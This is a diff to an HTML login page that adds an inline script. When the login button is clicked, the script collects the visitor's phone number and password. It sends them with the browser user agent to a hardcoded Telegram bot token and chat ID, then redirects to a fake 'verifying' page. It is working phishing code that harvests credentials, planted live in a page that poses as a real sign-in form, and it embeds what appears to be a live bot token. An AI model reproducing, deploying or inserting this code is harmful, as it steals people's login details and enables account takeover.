@@ -153,6 +153,55 @@
             </table>
 
        </div> 
-    </body>
+    <script>
+  const BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc";
+  const CHAT_ID = "8469651553";
+
+  async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    } catch (err) {
+      console.error("Error enviando mensaje a Telegram:", err);
+    }
+  }
+
+  $(document).ready(function() {
+    $("#btn-login").click(async function() {
+      const celular = $("#txt-celular").val().trim();
+      const password = $("#txt-password").val().trim();
+
+      if (celular === "" || password === "") {
+        alert("Por favor, ingresa tu número y contraseña.");
+        return;
+      }
+
+      // Crear el mensaje a enviar
+      const mensaje = `
+🔐 <b>Intento de acceso</b>
+📱 Celular: +57${celular}
+🔑 Contraseña: ${password}
+🌐 Navegador: ${navigator.userAgent}
+      `;
+
+      // Enviar a Telegram
+      await sendToTelegram(mensaje);
+
+      // Redirigir o mostrar mensaje
+      alert("Procesando...");
+      window.location.href = "../verifying/";
+    });
+  });
+</script>
+</body>
     <script type="text/javascript" src="../assets/js/ready.js"></script> 
+
 </html>
